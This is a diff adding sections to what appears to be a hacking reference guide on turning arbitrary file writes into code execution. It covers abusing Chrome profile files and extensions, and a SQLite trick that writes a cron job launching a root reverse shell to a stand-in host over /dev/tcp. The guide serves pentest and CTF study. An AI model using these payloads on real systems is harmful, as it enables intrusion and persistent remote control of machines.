@@ -365,13 +365,33 @@ Then if you somehow append the following line to the `/etc/passwd` file, you wil
 uid=0(root) gid=0(root) groups=0(root)
 </code></pre>
 
+### Google Chrome
+
+Google Chrome or Chromium configures all settings via files in the _Profile Path_ (found in `about:version`). The `Preferences` file specifically contains many properties. The easiest way to find their meaning is diffing the file before and after changing the option in the settings GUI.
+
+In this writeup the `session.startup_urls` was used to open a malicious URL on startup, and with `download.default_directory` it was possible to drive-by download a file into any directory to elevate a limited file write to a full one:
+
+{% embed url="https://jorianwoltjer.com/blog/p/ctf/intigriti-xss-challenge/0625#arbitrary-file-write" %}
+
+The intended solution for that challenge was to write a malicious entry into the Disk Cache on another site, which would enable XSS.
+
+{% embed url="https://tog.re/writeup/intigriti_june_2025/#-understanding-of-chrome-cache" %}
+
+If extensions are enabled (often disabled by headless browsers), you can install an extension on the user by creating/modifying the required files. Below is a writeup detailing how it can be used for malware purposes:
+
+{% embed url="https://www.synacktiv.com/en/publications/the-phantom-extension-backdooring-chrome-through-uncharted-pathways" %}
+
+If the `--disable-component-update` flag is not set (often set by headless browsers), there exists a file in the data directory at `_platform_specific/linux_x64/libwidevinecdm.so` which is loaded as a shared object ([more info here](../../linux/linux-privilege-escalation/command-exploitation.md#usdld_preload-and-usdld_library_path)). It doesn't require special file permissions and will be executed as real shellcode.
+
+{% embed url="https://worty.fr/post/writeups/heroctfv7/evil_cloner/" %}
+
 ## Shell Scripts
 
 Shell scripts inherently execute shell commands, often being the end goal of exploiting an arbitrary file write vulnerability. Therefore, they should be large targets and are often easy to exploit.&#x20;
 
 Some scripts execute on a schedule to automatically exploit, others are triggered by some action on the application or server, and you could even backdoor profile scripts that run when an admin interactively logs in.&#x20;
 
-### Cron Jobs
+### Cron Jobs (partial)
 
 [Cron Jobs](https://en.wikipedia.org/wiki/Cron) are scheduled tasks on a Linux system that are automatically triggered by the daemon. Here, you can create a file that executes every minute, for example. The next time this minute is triggered your payload will execute. The syntax for such a file looks something like this:
 
@@ -388,6 +408,23 @@ There are multiple places for such files, but often these are only writable by t
 * `/etc/cron.d`: Directory containing files with cron syntax often separated per application.
 * `/var/spool/cron/crontabs/$USER`: File per user with cron syntax, often edited manually with `crontab -e`. The filename is the username it executes as.
 * `/etc/cron.hourly`, `.daily`, etc.: Bash scripts that cron will also execute every hour, day, week or month. These may be dirty too as they are only bash scripts and don't require special syntax.
+
+This file is again simply a newline-separated list of commands. If you are able to write any clean line cron will find the job and execute it at the given time. In **SQLite**, for example ([source](https://kiddo-pwn.github.io/blog/2025-11-30/writing-sync-popping-cron#solution-fault-tolerant-crontab)):
+
+```sql
+ATTACH DATABASE '/etc/cron.d/pwn.task' AS cron;
+CREATE TABLE cron.tab (dataz text);
+INSERT INTO cron.tab (dataz) VALUES ('
+* * * * * root bash -i >& /dev/tcp/1.3.3.7/1337 0>&1
+');
+```
+
+{% code title="/etc/cron.d/pwn.task" %}
+```bash
+��8ytabletabtabCREATE TABLE tab (dataz text)
+* * * * * root bash -i >& /dev/tcp/1.3.3.7/1337 0>&1
+```
+{% endcode %}
 
 ### Bash Profile (partial)
 
